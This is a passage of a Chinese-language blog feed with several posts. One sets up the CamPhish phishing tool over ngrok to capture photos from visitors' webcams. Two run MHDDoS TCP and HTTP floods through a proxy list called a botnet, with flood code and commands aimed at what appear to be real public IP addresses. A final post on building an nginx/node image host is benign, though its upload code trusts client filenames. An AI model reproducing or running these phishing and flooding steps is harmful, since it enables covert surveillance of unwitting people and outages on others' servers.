    <content type="html"><![CDATA[<p>网站钓鱼</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/techchipnet/CamPhish.git<br></code></pre></td></tr></table></figure><h3 id="使用ngork访问网站"><a href="#使用ngork访问网站" class="headerlink" title="使用ngork访问网站"></a>使用ngork访问网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 根据需要安装不同版本  详情见官网 这里安装的是centos7下的ngrok</span><br>wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz<br><span class="hljs-comment"># 解压</span><br>tar -xzvf ng....<br><span class="hljs-comment"># 将ngork放到CamPhsih的文件夹中 就不需要脚本安装</span><br><span class="hljs-comment"># 设置ngork密钥</span><br>./ngrok authtoken ......................<br><span class="hljs-comment"># 启动服务</span><br>./camphish<br><span class="hljs-comment"># 选择 1 2 在输入youtube的视频id</span><br><span class="hljs-comment"># 此时网址会出现  等待🐟 上钩 会自动拍摄</span><br><span class="hljs-comment"># 。。。。。。。。。。。。。。。。。。。</span><br><span class="hljs-comment"># 。。。。。。。。。。。。。。。。。。。</span><br><span class="hljs-comment"># 等待</span><br></code></pre></td></tr></table></figure><h3 id="上钩"><a href="#上钩" class="headerlink" title="上钩"></a>上钩</h3><p><img src="https://s2.loli.net/2022/04/04/wJaxXLQcHoFEDmU.png" alt="image.png"></p><h3 id="获取到了图片"><a href="#获取到了图片" class="headerlink" title="获取到了图片"></a>获取到了图片</h3><p><img src="https://s2.loli.net/2022/04/04/G1xZji7hDJRSwcF.png" alt="image.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Illegal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDOS TYPE[TCP]</title>
    <link href="/2022/04/02/DDOS-TYPE-TCP/"/>
    <url>/2022/04/02/DDOS-TYPE-TCP/</url>
    
    <content type="html"><![CDATA[<p><code>using python3</code></p><h3 id="发送tcp-package方法"><a href="#发送tcp-package方法" class="headerlink" title="发送tcp package方法"></a>发送tcp package方法</h3><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">TCP</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">global</span> bytes_sent, REQUESTS_SENT<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> self.get_effective_socket(AF_INET, SOCK_STREAM) <span class="hljs-keyword">as</span> s:<br>                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, <span class="hljs-number">1</span>)<br>                s.connect(self._target)<br>                <span class="hljs-keyword">while</span> s.send(randbytes(<span class="hljs-number">1024</span>)):<br>                    REQUESTS_SENT += <span class="hljs-number">1</span><br>                    bytes_sent += <span class="hljs-number">1024</span><br>        <span class="hljs-keyword">except</span> Exception:<br>            s.close()<br></code></pre></td></tr></table></figure><h3 id="获取有效socket"><a href="#获取有效socket" class="headerlink" title="获取有效socket"></a>获取有效socket</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">   <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_effective_socket</span>(<span class="hljs-params">self,</span><br><span class="hljs-params">                            <span class="hljs-comment"># 指定使用何种的地址类型 </span></span><br><span class="hljs-params">                            conn_type=AF_INET, <span class="hljs-comment">#IPv4类型</span></span><br><span class="hljs-params">                            <span class="hljs-comment"># 设置通信的协议类型 udp ...</span></span><br><span class="hljs-params">                            sock_type=SOCK_STREAM, <span class="hljs-comment"># 提供面向连接的稳定数据传输，即TCP协议</span></span><br><span class="hljs-params">                            proto_type=IPPROTO_TCP</span>):<br><span class="hljs-comment"># 有代理服务器就发送给代理服务器 有代理服务器发送数据  不需要我们再接收</span><br>       <span class="hljs-keyword">if</span> self._proxies:<br>           <span class="hljs-keyword">return</span> randchoice(self._proxies).open_socket(<br>               conn_type, sock_type, proto_type)<br><span class="hljs-comment"># 直接由本机发送数据包</span><br>       <span class="hljs-keyword">return</span> socket(conn_type, sock_type, proto_type)<br></code></pre></td></tr></table></figure><h3 id="连接代理服务器socket"><a href="#连接代理服务器socket" class="headerlink" title="连接代理服务器socket"></a>连接代理服务器socket</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">open_socket</span>(<span class="hljs-params">self,</span><br><span class="hljs-params">                    family=AF_INET,</span><br><span class="hljs-params">                    <span class="hljs-built_in">type</span>=SOCK_STREAM,</span><br><span class="hljs-params">                    proto=-<span class="hljs-number">1</span>,</span><br><span class="hljs-params">                    fileno=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-keyword">return</span> ProxySocket(self, family, <span class="hljs-built_in">type</span>, proto, fileno)<br></code></pre></td></tr></table></figure><h3 id="ProxySocket继承socksocket-自定义参数"><a href="#ProxySocket继承socksocket-自定义参数" class="headerlink" title="ProxySocket继承socksocket 自定义参数"></a>ProxySocket继承socksocket 自定义参数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxySocket</span>(<span class="hljs-title class_ inherited__">socksocket</span>):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,</span><br><span class="hljs-params">                 proxy: Proxy,</span><br><span class="hljs-params">                 family=-<span class="hljs-number">1</span>,</span><br><span class="hljs-params">                 <span class="hljs-built_in">type</span>=-<span class="hljs-number">1</span>,</span><br><span class="hljs-params">                 proto=-<span class="hljs-number">1</span>,</span><br><span class="hljs-params">                 fileno=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-built_in">super</span>().__init__(family, <span class="hljs-built_in">type</span>, proto, fileno)<br>        <span class="hljs-keyword">if</span> proxy.port:<br>    <span class="hljs-comment"># 设置连接代理服务器的用户名密码</span><br>            <span class="hljs-keyword">if</span> proxy.user <span class="hljs-keyword">and</span> proxy.password:<br>                self.setproxy(proxy.<span class="hljs-built_in">type</span>.asPySocksType(),<br>                              proxy.host,<br>                              proxy.port,<br>                              username=proxy.user,<br>                              password=proxy.password)<br>                <span class="hljs-keyword">return</span><br>            self.setproxy(proxy.<span class="hljs-built_in">type</span>.asPySocksType(), proxy.host, proxy.port)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">if</span> proxy.user <span class="hljs-keyword">and</span> proxy.password:<br>            self.setproxy(proxy.<span class="hljs-built_in">type</span>.asPySocksType(),<br>                          proxy.host,<br>                          username=proxy.user,<br>                          password=proxy.password)<br>            <span class="hljs-keyword">return</span><br>        self.setproxy(proxy.<span class="hljs-built_in">type</span>.asPySocksType(), proxy.host)<br></code></pre></td></tr></table></figure><h3 id="开始攻击-对22-ssh-tcp端口进行攻击"><a href="#开始攻击-对22-ssh-tcp端口进行攻击" class="headerlink" title="开始攻击 对22 ssh tcp端口进行攻击"></a>开始攻击 对22 ssh tcp端口进行攻击</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo python3 start.py TCP 121.5.60.8:22 1000 100 1 socks5.txt 1<br></code></pre></td></tr></table></figure><h3 id="冲啊-biubiubiu"><a href="#冲啊-biubiubiu" class="headerlink" title="冲啊 biubiubiu"></a>冲啊 biubiubiu</h3><p><img src="https://s2.loli.net/2022/04/02/kGiFK5bYjrpNO24.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/04/02/IAilNhHcpFwKEPZ.png" alt="image.png"></p><h3 id="本地尝试连接ssh"><a href="#本地尝试连接ssh" class="headerlink" title="本地尝试连接ssh"></a>本地尝试连接ssh</h3><p><img src="https://s2.loli.net/2022/04/02/37DVQurlzMd2na5.png" alt="image.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>DDOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DDOS 记录-TYPE[POST]</title>
    <link href="/2022/03/31/DDOS-%E8%AE%B0%E5%BD%95-TYPE-POST/"/>
    <url>/2022/03/31/DDOS-%E8%AE%B0%E5%BD%95-TYPE-POST/</url>
    
    <content type="html"><![CDATA[<h3 id="DDOS-HTTP攻击"><a href="#DDOS-HTTP攻击" class="headerlink" title="DDOS HTTP攻击"></a>DDOS HTTP攻击</h3><p>MHDDOS支持以下功能</p><ul><li>LAYER7<ul><li><code>GET | POST | OVH | STRESS | DYN | DOWNLOADER | SLOW | HEAD | NULL USERAGENT | COOKIE | PPS</code></li><li><code>EVEN | GSB | DGB | AVB | BOT | APACHE | XMLRPC | CFB | CFBUAM | BYPASS | BOMB</code></li></ul></li><li>LAYER4<ul><li><code>TCP | UDP | SYN | VSE | MEM | NTP | MCBOT | MINECRAFT | DNS | CHAR | ARD | RDP</code></li></ul></li><li>工具<ul><li><code>Find Real IP Address Of Websites Powered By Cloudflare</code></li><li><code>Show DNS Records Of Sites</code></li><li><code>TeamSpeak SRV Resolver</code></li><li><code>PING Servers</code></li><li><code>Check If Websites Status</code></li><li><code>That Shows Bytes Received, bytes Sent and their amount</code></li></ul></li><li>其他<ul><li><code>STOP ATTACK </code></li><li><code>TOOLS</code></li><li><code>HELP SHOW USAGES</code></li></ul></li></ul><h3 id="网站未被攻击时请求状况"><a href="#网站未被攻击时请求状况" class="headerlink" title="网站未被攻击时请求状况"></a>网站未被攻击时请求状况</h3><p><img src="https://s2.loli.net/2022/03/31/ZRcsBNqbPUCkyFd.png"></p><h3 id="开始执行-对目标主机开启1000个线程维持1000s的HTTP攻击"><a href="#开始执行-对目标主机开启1000个线程维持1000s的HTTP攻击" class="headerlink" title="开始执行 :) 对目标主机开启1000个线程维持1000s的HTTP攻击"></a>开始执行 :) 对目标主机开启1000个线程维持1000s的HTTP攻击</h3><figure class="highlight shell"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs shell">python .\start.py post http://51.38.92.223 1 1000 socks5.txt 100 1000 1<br></code></pre></td></tr></table></figure><h3 id="终端log"><a href="#终端log" class="headerlink" title="终端log"></a>终端log</h3><p><img src="https://s2.loli.net/2022/03/31/xm6OoXSwRMT4Wct.png"></p><h3 id="被攻击网站请求情况"><a href="#被攻击网站请求情况" class="headerlink" title="被攻击网站请求情况"></a>被攻击网站请求情况</h3><p><img src="https://s2.loli.net/2022/03/31/63RqwTvgLI1PF2h.png"></p><h3 id="攻击结束"><a href="#攻击结束" class="headerlink" title="攻击结束"></a>攻击结束</h3><p><img src="https://s2.loli.net/2022/03/31/fiT9ugWMXbJ2ykv.png"></p><h3 id="如果攻击的是自己的服务器-可以找到nginx的access-log-并进行数据统计分析"><a href="#如果攻击的是自己的服务器-可以找到nginx的access-log-并进行数据统计分析" class="headerlink" title="如果攻击的是自己的服务器 可以找到nginx的access.log 并进行数据统计分析"></a>如果攻击的是自己的服务器 可以找到nginx的access.log 并进行数据统计分析</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">vim</span> access.log <span class="hljs-comment">#如下结果</span><br><span class="hljs-number">121.156.109.108</span> - - [<span class="hljs-number">02</span>/Apr/<span class="hljs-number">2022</span>:<span class="hljs-number">13</span>:<span class="hljs-number">17</span>:<span class="hljs-number">13</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">&quot;GET / HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">4833</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36&quot;</span> <span class="hljs-string">&quot;102.30.67.109&quot;</span><br><span class="hljs-number">121.156.109.108</span> - - [<span class="hljs-number">02</span>/Apr/<span class="hljs-number">2022</span>:<span class="hljs-number">13</span>:<span class="hljs-number">17</span>:<span class="hljs-number">13</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">&quot;GET / HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">4833</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36&quot;</span> <span class="hljs-string">&quot;102.30.67.109&quot;</span><br><span class="hljs-number">205.155.45.164</span> - - [<span class="hljs-number">02</span>/Apr/<span class="hljs-number">2022</span>:<span class="hljs-number">13</span>:<span class="hljs-number">17</span>:<span class="hljs-number">13</span> +<span class="hljs-number">0800</span>] <span class="hljs-string">&quot;GET / HTTP/1.2&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">4833</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7;en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17&quot;</span> <span class="hljs-string">&quot;107.41.228.228&quot;</span><br><span class="hljs-comment"># 使用linux自带命令行进行统计</span><br>$ cat access.log | awk <span class="hljs-string">&#x27;&#123;print <span class="hljs-variable">$1</span>&#125;&#x27;</span> | sort -nr | uniq -c | sort -nrk1,<span class="hljs-number">1</span><br>-nr number reverse<br>-c count times the str occurs<br>-nrk1,<span class="hljs-number">1</span> tart at column <span class="hljs-number">1</span> end at column <span class="hljs-number">1</span> and <span class="hljs-literal">select</span> a white space separated column from the input 从输入中选择一个空格分隔的列<br><br>结果<br><span class="hljs-number">46445</span> <span class="hljs-number">205.155.45.164</span><br>   <span class="hljs-number">9621</span> <span class="hljs-number">121.156.109.108</span><br>   <span class="hljs-number">7079</span> <span class="hljs-number">1.13.165.87</span><br>   <span class="hljs-number">1369</span> <span class="hljs-number">84.252.139.198</span><br>    <span class="hljs-number">653</span> <span class="hljs-number">103.1.104.14</span><br>    <span class="hljs-number">336</span> <span class="hljs-number">74.208.150.121</span><br>    <span class="hljs-number">334</span> <span class="hljs-number">200.111.182.6</span><br>    <span class="hljs-number">246</span> <span class="hljs-number">95.67.19.181</span><br>    <span class="hljs-number">149</span> <span class="hljs-number">91.217.42.64</span><br>    <span class="hljs-number">130</span> <span class="hljs-number">83.12.128.41</span><br>    <span class="hljs-number">108</span> <span class="hljs-number">120.71.15.82</span><br>     <span class="hljs-number">91</span> <span class="hljs-number">113.28.90.67</span><br>     <span class="hljs-number">85</span> <span class="hljs-number">77.233.5.68</span><br>     <span class="hljs-number">40</span> <span class="hljs-number">185.94.218.57</span><br>     <span class="hljs-number">27</span> <span class="hljs-number">159.192.147.186</span><br>     <span class="hljs-number">11</span> <span class="hljs-number">124.160.225.82</span><br>      <span class="hljs-number">6</span> <span class="hljs-number">45.173.199.120</span><br>      <span class="hljs-number">3</span> <span class="hljs-number">197.156.64.247</span><br>      <span class="hljs-number">1</span> <span class="hljs-number">83.97.20.34</span><br>      <span class="hljs-number">1</span> <span class="hljs-number">119.147.3.94</span><br>      <span class="hljs-number">1</span> <span class="hljs-number">118.126.124.172</span><br></code></pre></td></tr></table></figure><p><a href = "https://github.com/Sobev/bash/blob/main/wrangling.sh"> linux下的数据处理笔记</a></p><p><a href = "/img/socks5.txt">代理僵尸网络 </a></p>]]></content>
    
    
    
    <tags>
      
      <tag>DDOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nodejs + nginx搭建图床</title>
    <link href="/2022/03/30/nodejs-nginx%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/"/>
    <url>/2022/03/30/nodejs-nginx%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<h3 id="nginx配置"><a href="#nginx配置" class="headerlink" title="nginx配置"></a>nginx配置</h3><p>在/etc/nginx/conf.d/目录下的default.conf中写入</p><figure class="highlight nginx"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><pre><code class="hljs nginx">   <span class="hljs-comment"># 查看图片，开启index</span><br>   <span class="hljs-section">location</span> /imgbed &#123;<br>       <span class="hljs-attribute">alias</span> /opt/hexo/public/img; <span class="hljs-comment">#</span><br>       <span class="hljs-attribute">autoindex</span> <span class="hljs-literal">on</span>;<br>   &#125;<br><br>   <span class="hljs-section">location</span> /post &#123;<br>       <span class="hljs-attribute">add_header</span> Access-Control-Allow-Origin *;<br>       <span class="hljs-attribute">add_header</span> Access-Control-Allow-Headers *;<br>       <span class="hljs-attribute">add_header</span> Access-Control-Allow-Methods <span class="hljs-string">&quot;GET, POST, PUT, OPTIONS&quot;</span>;<br>       <span class="hljs-attribute">if</span> (<span class="hljs-variable">$request_method</span> = <span class="hljs-string">&#x27;OPTIONS&#x27;</span>) &#123;<br>           <span class="hljs-attribute">return</span> <span class="hljs-number">200</span>;<br>       &#125;<br>       <span class="hljs-attribute">client_max_body_size</span> <span class="hljs-number">100m</span>;<br><span class="hljs-comment"># 代理给本地服务 </span><br>       <span class="hljs-attribute">proxy_pass</span> http://up;<br>   &#125;<br><br></code></pre></td></tr></table></figure><p>在相同目录新建stream.conf 配置将请求转发给本地的8888端口，也就是nodejs图片上传服务</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">upstream</span> up &#123;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">127.0.0.1:8888</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="选择一个目录初始化"><a href="#选择一个目录初始化" class="headerlink" title="选择一个目录初始化"></a>选择一个目录初始化</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm init<br>npm --save install express<br>npm --save install formidable<br></code></pre></td></tr></table></figure><h3 id="搭建express文件上传服务"><a href="#搭建express文件上传服务" class="headerlink" title="搭建express文件上传服务"></a>搭建express文件上传服务</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> formidable = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;formidable&#x27;</span>);<br><span class="hljs-comment">// 提前建好目录</span><br><span class="hljs-keyword">var</span> cacheFolder = <span class="hljs-string">&#x27;/opt/hexo/public/img/&#x27;</span>;<br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;./&quot;</span>))<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/post&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br><br><span class="hljs-keyword">var</span> form = <span class="hljs-keyword">new</span> formidable.<span class="hljs-title class_">IncomingForm</span>();<br>form.<span class="hljs-property">encoding</span> = <span class="hljs-string">&#x27;utf-8&#x27;</span>;<br>form.<span class="hljs-property">uploadDir</span> = cacheFolder;<br>  form.<span class="hljs-property">keepExtensions</span> = <span class="hljs-literal">true</span>; <br>  form.<span class="hljs-property">maxFieldsSize</span> = <span class="hljs-number">100</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>;<br>  form.<span class="hljs-property">type</span> = <span class="hljs-literal">true</span>;<br>form.<span class="hljs-title function_">parse</span>(req, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, fields, files</span>) &#123;<br>  <span class="hljs-keyword">if</span> (err) &#123;<br>         <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(err);<br>  &#125;<br>  <span class="hljs-keyword">var</span> extName = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">switch</span> (files.<span class="hljs-property">filepond</span>.<span class="hljs-property">type</span>) &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/pjpeg&#x27;</span>:<br>          extName = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/jpeg&#x27;</span>:<br>          extName = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/png&#x27;</span>:<br>          extName = <span class="hljs-string">&#x27;png&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;image/x-png&#x27;</span>:<br>          extName = <span class="hljs-string">&#x27;png&#x27;</span>;<br>          <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;video/mp4&#x27;</span>:<br> extName = <span class="hljs-string">&#x27;mp4&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;application/x-zip-compressed&#x27;</span>:<br>extName = <span class="hljs-string">&#x27;zip&#x27;</span>;<br><span class="hljs-keyword">break</span>;<br>    <span class="hljs-attr">default</span>:<br><span class="hljs-keyword">let</span> fn = files.<span class="hljs-property">filepond</span>.<span class="hljs-property">originalFilename</span>;<br><span class="hljs-keyword">if</span>(fn.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;.&quot;</span>) != -<span class="hljs-number">1</span>)&#123;<br>    extName = fn.<span class="hljs-title function_">substr</span>(fn.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>) ;<br>&#125;<br><span class="hljs-keyword">break</span>;<br><br>  &#125;<br><span class="hljs-comment">//如果出错 开启打印  可能path为undefined 字段可能为filepath  以下的originalFilename也一样</span><br><span class="hljs-comment">//console.log(files.filepond.path);</span><br>  <span class="hljs-keyword">if</span> (extName.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) &#123;<br>          <span class="hljs-keyword">return</span>  res.<span class="hljs-title function_">json</span>(&#123;<br>          <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;只支持png和jpg格式图片&#x27;</span><br>      &#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">var</span> originName = files.<span class="hljs-property">filepond</span>.<span class="hljs-property">originalFilename</span>;<br>                    originName = originName.<span class="hljs-title function_">substr</span>(<span class="hljs-number">0</span>, originName.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>));<br>    <span class="hljs-keyword">if</span>(originName === <span class="hljs-string">&quot;index&quot;</span>) originName = <span class="hljs-string">&quot;FORBIDDEN_INDEX_NAME&quot;</span><br>                    <span class="hljs-keyword">var</span> avatarName = <span class="hljs-string">&#x27;/&#x27;</span> + originName + <span class="hljs-string">&#x27;.&#x27;</span> +  extName;<br>          <span class="hljs-keyword">var</span> newPath = cacheFolder + avatarName;<br>    <span class="hljs-keyword">var</span> returnPath = <span class="hljs-string">&#x27;images&#x27;</span>+avatarName;<br>          fs.<span class="hljs-title function_">renameSync</span>(files.<span class="hljs-property">filepond</span>.<span class="hljs-property">filepath</span>, newPath);<br>          <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(returnPath);<br>  &#125;<br>&#125;);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8888</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;app is listening&quot;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="搭建文件上传页面-index-html-使用filepond上传"><a href="#搭建文件上传页面-index-html-使用filepond上传" class="headerlink" title="搭建文件上传页面 index.html 使用filepond上传"></a>搭建文件上传页面 index.html 使用filepond上传</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span 